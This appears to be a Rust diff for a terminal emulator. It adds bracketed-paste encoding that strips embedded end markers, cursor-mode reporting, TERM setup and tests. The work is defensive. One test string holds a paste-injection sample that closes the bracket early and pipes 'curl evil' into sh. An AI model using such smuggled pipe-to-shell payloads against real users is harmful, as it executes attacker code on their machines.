@@ -87,6 +87,11 @@ pub struct Snapshot {
     pub scroll_offset: usize,
     /// How far back it is possible to scroll.
     pub scroll_max: usize,
+    /// DECCKM: the keyboard encoder must send `ESC O A` for Up, not `ESC [ A`.
+    pub app_cursor: bool,
+    /// DECTCEM. Full-screen programs hide the cursor while they draw; a block
+    /// left behind on whatever cell they last touched is visual noise.
+    pub cursor_visible: bool,
 }
 
 /* ---- Colour resolution --------------------------------------------------- */
@@ -187,11 +192,59 @@ fn reconcile(screen: &Screen, predictor: &mut Predictor, dirty: &mut [bool]) {
 /// Does this write carry a bracketed paste?
 ///
 /// §5.5 forbids predicting during one: the paste is not echoed character by
-/// character, so every prediction in it would miss. Nothing in the app sends a
-/// paste yet, but the check belongs with the gate rather than with the future
-/// paste path, where it would be easy to forget.
+/// character, so every prediction in it would miss. [`Session::paste`] never
+/// reaches the predictor at all; this catches a paste that arrives as keystroke
+/// bytes anyway (broadcast, or a future caller), where it would be easy to forget.
 fn is_paste(bytes: &[u8]) -> bool {
-    bytes.windows(6).any(|w| w == b"\x1b[200~")
+    bytes.windows(6).any(|w| w == PASTE_START)
+}
+
+const PASTE_START: &[u8] = b"\x1b[200~";
+const PASTE_END: &[u8] = b"\x1b[201~";
+
+/// Clipboard text -> the bytes a terminal sends for a paste.
+///
+/// Two rules, both from xterm and followed by every terminal since:
+///
+/// 1. **Line endings become `CR`.** That is what the Enter key sends. A bare
+///    `LF` would reach a raw-mode program as Ctrl+J, and `CRLF` from a Windows
+///    clipboard would press Enter twice per line.
+/// 2. **With `?2004` set, wrap in `ESC[200~ … ESC[201~`** — and remove any
+///    `ESC[201~` already inside the text. Without that, clipboard content can
+///    close the bracket early and everything after it is *typed*, so a pasted
+///    line ending in a newline executes. That is a real attack on people who
+///    paste commands from web pages, and the bracket exists to stop it.
+///
+/// Without bracketed paste the text is sent as typed, newlines included. The
+/// shells that ship with every current distro (bash ≥ 5.1, zsh, fish) enable
+/// the mode, so this branch is old servers and raw programs.
+pub fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
+    let mut out = Vec::with_capacity(text.len() + 12);
+    if bracketed {
+        out.extend_from_slice(PASTE_START);
+    }
+    let bytes = text.as_bytes();
+    let mut i = 0;
+    // O(n) in the pasted text: one pass, each byte copied at most once.
+    while i < bytes.len() {
+        let b = bytes[i];
+        if b == b'\r' {
+            out.push(b'\r');
+            i += if bytes.get(i + 1) == Some(&b'\n') { 2 } else { 1 };
+        } else if b == b'\n' {
+            out.push(b'\r');
+            i += 1;
+        } else if bracketed && bytes[i..].starts_with(PASTE_END) {
+            i += PASTE_END.len();
+        } else {
+            out.push(b);
+            i += 1;
+        }
+    }
+    if bracketed {
+        out.extend_from_slice(PASTE_END);
+    }
+    out
 }
 
 /// Where a session's bytes come from.
@@ -258,6 +311,34 @@ impl Session {
         for a in &shell.args {
             cmd.arg(a);
         }
+        // Say what this terminal is. On Linux and macOS the child inherits the
+        // *launching* environment: started from a desktop launcher there is no
+        // TERM at all (shells fall back to "dumb": no colour, `clear` fails,
+        // vim complains), and started from another terminal it inherits that
+        // terminal's identity — `xterm-kitty`, say — and emits sequences for a
+        // terminal this is not. The parser speaks xterm plus `SGR 38;2` truecolour.
+        cmd.env("TERM", "xterm-256color");
+        cmd.env("COLORTERM", "truecolor");
+        cmd.env("TERM_PROGRAM", "OpsPilot");
+        cmd.env("TERM_PROGRAM_VERSION", env!("CARGO_PKG_VERSION"));
+        // Markers that make tools believe they are inside *another* emulator
+        // and switch to its private protocols (kitty graphics, VTE prompts).
+        for k in [
+            "KITTY_WINDOW_ID",
+            "KITTY_PID",
+            "WEZTERM_PANE",
+            "WEZTERM_EXECUTABLE",
+            "ALACRITTY_WINDOW_ID",
+            "ALACRITTY_SOCKET",
+            "VTE_VERSION",
+            "KONSOLE_VERSION",
+            "GNOME_TERMINAL_SCREEN",
+            "TERMINAL_EMULATOR",
+        ] {
+            cmd.env_remove(k);
+        }
+        // Per-shell env last, so a shell that genuinely needs a different TERM
+        // can still say so.
         for (k, v) in &shell.env {
             cmd.env(k, v);
         }
@@ -315,6 +396,11 @@ impl Session {
                     let mut buf = vec![0u8; READ_BUF];
                     loop {
                         match reader.read(&mut buf) {
+                            // A signal landing mid-read (SIGCHLD, SIGWINCH on
+                            // resize) is not the session ending. Treating it as
+                            // one kills a live Unix terminal at random.
+                            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
+                            // Linux reports a closed PTY as EIO, not EOF.
                             Ok(0) | Err(_) => break,
                             Ok(n) => {
                                 if let Ok(mut g) = inner.lock() {
@@ -547,6 +633,28 @@ impl Session {
 
             self.predict(&mut g, bytes);
         }
+        self.send(bytes)
+    }
+
+    /// Paste text, encoded for whatever the application currently expects.
+    ///
+    /// Separate from [`write`](Self::write) for two reasons: the bracketed-paste
+    /// decision must use the mode as it is *now*, which only this side knows;
+    /// and a paste must never reach the predictor (§5.5).
+    pub fn paste(&self, text: &str) -> Result<(), String> {
+        let bracketed = {
+            let mut g = self.inner.lock().map_err(|_| "screen poisoned")?;
+            if g.scroll_offset != 0 {
+                g.scroll_offset = 0;
+                g.full_repaint = true;
+                self.generation.fetch_add(1, Ordering::Release);
+            }
+            g.screen.modes().bracketed_paste
+        };
+        self.send(&paste_bytes(text, bracketed))
+    }
+
+    fn send(&self, bytes: &[u8]) -> Result<(), String> {
         self.bytes_out
             .fetch_add(bytes.len() as u64, Ordering::Relaxed);
         match &self.backend {
@@ -665,6 +773,7 @@ impl Session {
         // exactly the lag prediction exists to remove (§5.5).
         let cursor = g.predictor.cursor().unwrap_or(g.screen.grid().cursor);
         let title = g.screen.title.clone();
+        let modes = g.screen.modes();
         let offset = g.scroll_offset;
         let scroll_max = g.screen.scrollback().len();
         // At most MAX_OUTSTANDING (12) entries, and empty in steady state.
@@ -717,6 +826,10 @@ impl Session {
             full: full || offset > 0,
             scroll_offset: offset,
             scroll_max,
+            app_cursor: modes.app_cursor,
+            // Hidden while scrolled back too: the caret belongs to the live
+            // screen, not to a row of history that happens to share its index.
+            cursor_visible: modes.cursor_visible && offset == 0,
         }))
     }
 }
@@ -998,6 +1111,41 @@ mod tests {
     use super::*;
     use std::time::{Duration, Instant};
 
+    #[test]
+    fn paste_turns_every_line_ending_into_enter() {
+        assert_eq!(paste_bytes("a\nb", false), b"a\rb");
+        assert_eq!(paste_bytes("a\r\nb\r\n", false), b"a\rb\r");
+        assert_eq!(paste_bytes("a\rb", false), b"a\rb");
+        assert_eq!(paste_bytes("", false), b"");
+        // Multi-byte UTF-8 passes through untouched.
+        assert_eq!(paste_bytes("é→\n", false), "é→\r".as_bytes());
+    }
+
+    #[test]
+    fn bracketed_paste_is_wrapped() {
+        assert_eq!(paste_bytes("ls\n", true), b"\x1b[200~ls\r\x1b[201~");
+        assert!(is_paste(&paste_bytes("x", true)));
+    }
+
+    #[test]
+    fn pasted_text_cannot_close_the_bracket_early() {
+        // The attack: a web page hides `ESC[201~` in copyable text, so
+        // everything after it is typed rather than pasted and the newline runs
+        // it. The only end marker in the output must be ours, at the very end.
+        let hostile = "echo safe\x1b[201~curl evil | sh\n";
+        let out = paste_bytes(hostile, true);
+        let ends = out.windows(PASTE_END.len()).filter(|w| *w == PASTE_END).count();
+        assert_eq!(ends, 1, "{:?}", String::from_utf8_lossy(&out));
+        assert!(out.ends_with(PASTE_END));
+        assert_eq!(out, b"\x1b[200~echo safecurl evil | sh\r\x1b[201~");
+    }
+
+    #[test]
+    fn a_partial_end_marker_is_kept_verbatim() {
+        // Only the complete sequence is special; a prefix of it is just text.
+        assert_eq!(paste_bytes("\x1b[201", true), b"\x1b[200~\x1b[201\x1b[201~");
+    }
+
     /// Poll until `f` is true or the deadline passes. A shell takes an
     /// unpredictable moment to start and print a prompt, so a fixed sleep would
     /// be either slow or flaky.
@@ -1057,6 +1205,67 @@ mod tests {
             "command output never appeared. Screen was:\n{}",
             screen_text(&session)
         );
+    }
+
+    /// `sh -c <script>` on a PTY: a program that draws no prompt, so nothing
+    /// but the script touches the terminal modes.
+    #[cfg(unix)]
+    fn run_sh(script: &str) -> Session {
+        let sh = crate::shells::ShellInfo {
+            id: "test-sh".into(),
+            label: "sh".into(),
+            program: "/bin/sh".into(),
+            args: vec!["-c".into(), script.into()],
+            env: Vec::new(),
+        };
+        Session::spawn(24, 80, sh).expect("spawn sh")
+    }
+
+    /// DECCKM and DECTCEM set by a real program reach the snapshot, which is
+    /// where the keyboard encoder reads them. Without this, arrows in htop and
+    /// nano print letters on Linux.
+    ///
+    /// Not tested at a shell prompt: zsh sets DECCKM itself every time it draws
+    /// one (terminfo `smkx`), which is the strongest argument for honouring it.
+    #[cfg(unix)]
+    #[test]
+    fn modes_set_by_the_program_reach_the_snapshot() {
+        let session = run_sh("printf '\\033[?1h\\033[?2004h\\033[?25l'; echo ready; sleep 5");
+        assert!(
+            wait_until(Duration::from_secs(10), || screen_text(&session).contains("ready")),
+            "program never ran. Screen was:\n{}",
+            screen_text(&session)
+        );
+        let snap = session.snapshot(0).unwrap().expect("a snapshot");
+        assert!(snap.app_cursor, "DECCKM not reported");
+        assert!(!snap.cursor_visible, "DECTCEM off not reported");
+        assert!(session.inner.lock().unwrap().screen.modes().bracketed_paste);
+    }
+
+    /// A paste reaches the program as typed text with CR line endings, and in
+    /// bracketed mode the program receives the markers around it.
+    // GNU `od` column layout; BSD's differs.
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn a_paste_reaches_the_program_bracketed() {
+        // `od -c` shows exactly which bytes arrived. Raw mode so the line
+        // discipline passes ESC and CR through untranslated.
+        let session = run_sh(
+            "printf '\\033[?2004h'; stty raw -echo; echo ready; \
+             head -c 16 | od -An -c; sleep 5",
+        );
+        assert!(wait_until(Duration::from_secs(10), || screen_text(&session)
+            .contains("ready")));
+        // 4 + 2 bytes of text, 6 + 6 of markers = 18; `head -c 16` stops
+        // before the end marker's last two bytes, which is enough to see it.
+        session.paste("ab\r\ncd").unwrap();
+        let ok = wait_until(Duration::from_secs(10), || {
+            let t = screen_text(&session);
+            // od prints ESC as 033 and CR as \r: start marker, text with ONE
+            // CR for the CRLF, then the start of the end marker.
+            t.contains("033   [   2   0   0   ~   a   b  \\r   c   d 033   [   2   0")
+        });
+        assert!(ok, "unexpected bytes. Screen was:\n{}", screen_text(&session));
     }
 
     #[test]
